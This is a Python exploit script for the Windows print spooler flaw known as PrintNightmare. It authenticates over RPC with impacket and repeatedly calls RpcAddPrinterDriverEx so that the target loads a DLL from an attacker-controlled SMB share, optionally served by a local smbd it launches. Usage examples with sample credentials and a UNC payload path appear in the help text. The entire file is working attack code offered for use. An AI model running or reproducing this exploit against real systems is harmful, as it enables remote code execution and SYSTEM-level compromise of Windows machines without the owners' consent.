#!/usr/local/bin/python
from subprocess import Popen
from argparse import ArgumentParser, HelpFormatter, Namespace
from pathlib import PureWindowsPath
from re import compile

from impacket.dcerpc.v5 import epm, rprn, transport
from impacket.dcerpc.v5.ndr import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException, DCERPC_v5

import my_rprn


def connect_tcp(username: str, password: str, domain: str, address: str) -> DCERPC_v5:
    # endpoint mapper listen on port 135
    resp = epm.hept_map(address, remoteIf=rprn.MSRPC_UUID_RPRN, protocol="ncacn_ip_tcp")
    port = compile(r"[^\[]*\[(\d+)]").match(resp).group(1)
    if int(port) not in range(0, 65535):
        raise Exception("Cannot get RPRN's port!")

    RpcTransport = transport.TCPTransport(address, dstport=port)

    print(f"[*] Connecting to ncacn_ip_tcp: {address}:{port}")

    try:
        dce = RpcTransport.get_dce_rpc()
        dce.set_credentials(username, password, domain)
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except Exception as e:
        print("[-] Connection Failed")
        raise e
    print("[+] Bind OK")
    return dce


def connect_smb(username: str, password: str, domain: str, address: str, port: str = "445") -> DCERPC_v5:
    binding = fr'ncacn_np: {address}[\PIPE\spoolss]'
    RpcTransport = transport.DCERPCTransportFactory(binding)

    RpcTransport.set_dport(port)
    RpcTransport.setRemoteHost(address)

    if hasattr(RpcTransport, 'set_credentials'):
        RpcTransport.set_credentials(username, password, domain)

    print(f"[*] Connecting to {binding}")
    try:
        dce = RpcTransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except Exception as e:
        print("[-] Connection Failed")
        raise e
    print("[+] Bind OK")
    return dce


def arg_parse() -> Namespace:
    class CustomHelpFormatter(HelpFormatter):
        def _format_action_invocation(self, action):
            if not action.option_strings or action.nargs == 0:
                return super()._format_action_invocation(action)
            default = self._get_default_metavar_for_optional(action)
            args_string = self._format_args(action, default)
            return f"{', '.join(action.option_strings)}{f'={args_string}'}"


        def _fill_text(self, text, width, indent):
            return ''.join(indent + line for line in text.splitlines(keepends=True))

    fmt = lambda prog: CustomHelpFormatter(prog)
    # noinspection PyTypeChecker
    parser = ArgumentParser(description="This script exploits vulnerability of printer nightmare",
                            formatter_class=fmt,
                            epilog="""
Example:
  .\%(prog)s -t 'hackit.local/domain_user:Pass123@192.168.1.10' -p '\\\\192.168.1.215\\smb\\addCube.dll'
  .\%(prog)s -s -t 'hackit.local/domain_user:Pass123@192.168.1.10' -S  -p '\\\\192.168.1.215\\smb\\addCube.dll'
be careful about escape in linux shell!
  
Warning! If you upload the same name dll multiple times, Only the first one will be load into target system!
    """)
    parser.add_argument("-s", "--smb", action="store_true",
                        help="choose whether to use smb or tcp/ip protocol when connect to a windows computer")
    parser.add_argument("-S", "--share", action="store_true", required=False,
                        help="establish a smb server on your host, use linux smbd")
    group = parser.add_argument_group("required arguments")
    group.add_argument("-t", "--target", metavar="TARGET", required=True,
                       help="[domain/]username[:password]@<ip address>")
    group.add_argument("-p", "--path", metavar="PATH", required=True,
                       help="specify the exploit dll path you want to use")

    return parser.parse_args()


# def MySMBServer(shareName, sharePath):
#     server = SimpleSMBServer()
#     server.setSMB2Support(True)
#     server.addShare(shareName, sharePath)
#     server.start()


if __name__ == '__main__':
    options = arg_parse()

    use_smb: bool = options.smb
    path: str = options.path
    target: str = options.target

    # [domain/]username[:password]@<ip address>
    # hackit.local/domain_user:Pass123@192.168.1.10
    # [^/@:]+/  => hackit.local/    "?" means it's optional
    # [^@:]+  => domain_user        required
    # :([^@]*)  => :Pass123         optional
    # @                             required
    # (?:ip\.){3}ip\s*  => ip address required
    re_0_255 = r"(?:[0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])"
    pattern = compile(
        r"^(?:([^/@:]+)/)?([^@:]+)(?::([^@]+))?@((?:%s\.){3}%s)\s*$" % (re_0_255, re_0_255))
    info = pattern.match(target)
    if info is None:
        raise Exception("TARGET argument not match! Username and ip address are required.")
    domain, username, password, address = info.groups('')

    if use_smb:
        dce = connect_smb(username, password, domain, address)
    else:
        dce = connect_tcp(username, password, domain, address)

    # if we don't set the credentials, then we will get the error below
    # DCERPC Runtime Error: code: 1764 - rpc_s_cannot_support: The requested operation is not supported.
    resp = my_rprn.hRpcEnumPrinterDrivers(dce, pName=NULL, pEnvironment="Windows x64\x00", Level=2)
    blobs = my_rprn.DRIVER_INFO_2_ARRAY(b''.join(resp['pDrivers']), resp['pcReturned'])
    for blob in blobs["drivers"]:
        if "ntprint" in blob["DriverPathArray"].lower():
            unidrv_path = blob["DriverPathArray"]
            break
    else:
        raise Exception('Universal driver path not found!')

    process = None
    if options.share is True:
        process = Popen(["smbd", "-F", "-s", "smb.conf"])

    try:
        unidrv_path = str(PureWindowsPath(unidrv_path).parent) + "\\UNIDRV.DLL"
        if "\\\\" in path:
            path = path.replace("\\\\", "\\??\\UNC\\")

        print(f"[+] pDriverPath Found {unidrv_path}")
        print(f"[*] Executing {path}")

        # https://docs.microsoft.com/en-us/windows/win32/printdocs/driver-info-2
        container_info = my_rprn.DRIVER_CONTAINER()
        container_info["Level"] = 2
        container_info["DriverInfo"]["tag"] = 2
        container_info["DriverInfo"]["Level2"]["cVersion"] = 3
        container_info["DriverInfo"]["Level2"]["pName"] = "1234\x00"
        container_info["DriverInfo"]["Level2"]["pEnvironment"] = "Windows x64\x00"
        container_info["DriverInfo"]["Level2"]["pDriverPath"] = unidrv_path + '\x00'
        container_info["DriverInfo"]["Level2"]["pDataFile"] = f"{path}\x00"
        # A pointer to a null-terminated string that specifies a file name or a full path and file name for the device
        # driver's configuration dynamic-link library (for example, "C:\DRIVERS\Pscrptui.dll").
        # so this dll need to initialize
        container_info["DriverInfo"]["Level2"]["pConfigFile"] = "C:\\Windows\\System32\\winhttp.dll\x00"

        flag = my_rprn.APD_COPY_ALL_FILES | my_rprn.APD_COPY_FROM_DIRECTORY | my_rprn.APD_INSTALL_WARNED_DRIVER

        resp = my_rprn.hRpcAddPrinterDriverEx(dce, NULL, container_info, flag)
        print(f"[*] Stage 0: {resp['ErrorCode']}")
        # Need to run twice then target machine will move the data file into "old" directory
        resp = my_rprn.hRpcAddPrinterDriverEx(dce, NULL, container_info, flag)
        print(f"[*] Stage 1: {resp['ErrorCode']}")
        container_info['DriverInfo']['Level2']['pDataFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"
        for i in range(1, 100):
            try:
                container_info["DriverInfo"]["Level2"][
                    "pConfigFile"] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{}\\{}\x00" \
                    .format(i, path.split("\\")[-1])
                resp = my_rprn.hRpcAddPrinterDriverEx(dce, NULL, container_info, flag)
                print(f"[*] Stage {i + 1}: {resp['ErrorCode']}")
                if resp['ErrorCode'] == 0:
                    print("[+] Exploit Completed")
                    break
            except DCERPCException as e:
                if e.get_error_code() == 0x2:
                    print(f"[*] Stage {i + 1}: not find {container_info['DriverInfo']['Level2']['pConfigFile']}")
                    continue
                else:
                    raise e
    except Exception as e:
        raise e
    finally:
        if process and process.poll() is None:
            process.terminate()

        dce.disconnect()
